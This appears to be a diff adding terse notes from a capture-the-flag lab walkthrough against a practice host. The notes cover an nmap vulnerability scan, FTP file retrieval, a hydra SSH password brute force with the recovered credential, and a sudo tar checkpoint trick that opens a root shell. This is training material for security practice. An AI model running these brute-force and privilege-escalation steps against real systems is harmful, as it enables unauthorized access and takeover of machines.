@@ -1,0 +1,24 @@
+sudo nmap -sC -sV -sS -T4 -A -script vuln -oN info/log_nmap2.txt 10.10.40.63
+
+nmap found 21 open
+
+ftp 10.10.40.63
+ls
+get locks.txt
+get task.txt
+
+username: lin
+
+hydra -l lin -P locks.txt 10.10.40.63 ssh
+
+[22][ssh] host: 10.10.40.63   login: lin   password: RedDr4gonSynd1cat3
+
+ssh lin@10.10.40.63
+
+sudo -l
+
+User lin may run the following commands on bountyhacker:
+    (root) /bin/tar
+
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
